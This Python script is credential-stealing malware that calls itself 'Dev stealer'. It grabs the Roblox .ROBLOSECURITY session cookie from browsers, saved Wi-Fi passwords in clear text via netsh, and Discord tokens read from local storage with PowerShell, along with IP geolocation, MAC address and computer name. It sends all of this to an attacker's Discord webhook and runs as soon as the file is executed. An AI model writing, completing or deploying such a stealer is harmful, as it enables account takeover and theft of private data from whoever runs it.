import browser_cookie3
import json
import requests
import subprocess

def GetWifiPasswords():
    try:

        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
        output = result.stdout


        profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]

     
        wifi_passwords = []
        for profile in profiles:
            result = subprocess.run(["netsh", "wlan", "show", "profile", "name=" + profile, "key=clear"], capture_output=True, text=True)
            output = result.stdout

            password_line = [line.split(":")[1].strip() for line in output.split("\n") if "Key Content" in line]
            if password_line:
                wifi_passwords.append((profile, password_line[0]))

        return wifi_passwords
    except Exception as e:
        print("Failed to retrieve Wi-Fi passwords:", str(e))
        return []

def GetPublicIPAddress():
    try:
        ip_address = requests.get("https://api.ipify.org").text.strip()

        if ip_address:
            response = requests.get(f"http://ip-api.com/json/{ip_address}")
            data = response.json()

            isp = data.get("isp")
            city = data.get("city")
            region = data.get("regionName")
            country = data.get("country")

            return ip_address, isp, city, region, country
        else:
            print("Failed to retrieve public IP address.")
            return None, None, None, None, None
    except Exception as e:
        print("Failed to retrieve public IP address:", str(e))
        return None, None, None, None, None

def GetMacAddress():
    try:
        result = subprocess.run(["getmac", "/FO", "CSV", "/NH"], capture_output=True, text=True)
        output = result.stdout.strip()

        mac_address = output.split(",")[0].replace('"', '')

        return mac_address
    except Exception as e:
        print("Failed to retrieve MAC address:", str(e))
        return None

def SendToDiscord(webhook_url, roblosecurity_cookie, wifi_passwords, ip_address, isp, city, region, country, mac_address, discord_token, computer_name):
    roblosecurity_embed = {
        "title": "Dev stealer caught .ROBLOSECURITY Cookie!",
        "description": f"```{roblosecurity_cookie}```",
        "color": 0x00FF00
    }

    wifi_passwords_embed = {
        "title": "Dev stealer got Wi-Fi Passwords!",
        "description": "".join([f"```{profile}: {password}```" for profile, password in wifi_passwords]),
        "color": 0x00FF00
    }

    networking_info_embed = {
        "title": "Dev stealer got IP Info!",
        "fields": [
            {"name": "Public IP Address", "value": f"```{ip_address}```", "inline": False},
            {"name": "ISP", "value": f"```{isp}```", "inline": True},
            {"name": "City", "value": f"```{city}```", "inline": True},
            {"name": "Region", "value": f"```{region}```", "inline": True},
            {"name": "Country", "value": f"```{country}```", "inline": True}
        ],
        "color": 0x00FF00
    }

    main_info_embed = {
        "title": "Main Info",
        "fields": [
            {"name": "Discord Token", "value": f"```{discord_token}```", "inline": False}
        ],
        "color": 0x0000FF
    }

    computer_info_embed = {
        "title": "Computer Info",
        "fields": [
            {"name": "MAC Address", "value": f"```{mac_address}```", "inline": True},
            {"name": "Computer Name", "value": f"```{computer_name}```", "inline": True}
        ],
        "color": 0x0000FF
    }

    payload = {
        "embeds": [
            roblosecurity_embed,
            wifi_passwords_embed,
            networking_info_embed,
            main_info_embed,
            computer_info_embed
        ]
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)

    if response.status_code == 204:
        print("Data sent to Discord webhook successfully.")
    else:
        print("Failed to send data to Discord webhook.")

def Main():
    webhook_url = "Webhook url here"

    roblosecurity_cookie = None
    cookies = browser_cookie3.load()
    for cookie in cookies:
        if cookie.name == ".ROBLOSECURITY":
            roblosecurity_cookie = cookie.value
            break

    if roblosecurity_cookie:
        print(".ROBLOSECURITY:", roblosecurity_cookie)


        wifi_passwords = GetWifiPasswords()


        ip_address, isp, city, region, country = GetPublicIPAddress()

     
        mac_address = GetMacAddress()

       
        discord_token = subprocess.run(["powershell", "-Command", "Get-Content -Path $env:APPDATA\\discord\\Local Storage\\leveldb\\*.ldb | Select-String -Pattern 'oken' | %{$_.Matches} | %{$_.Value}"], capture_output=True, text=True).stdout.strip()


        computer_name = subprocess.run(["powershell", "-Command", "$env:COMPUTERNAME"], capture_output=True, text=True).stdout.strip()

        if ip_address is not None:
     
            SendToDiscord(webhook_url, roblosecurity_cookie, wifi_passwords, ip_address, isp, city, region, country, discord_token, mac_address, computer_name)
        else:
            print("Public IP address not available")
    else:
        print(".ROBLOSECURITY cookie not found")

Main()
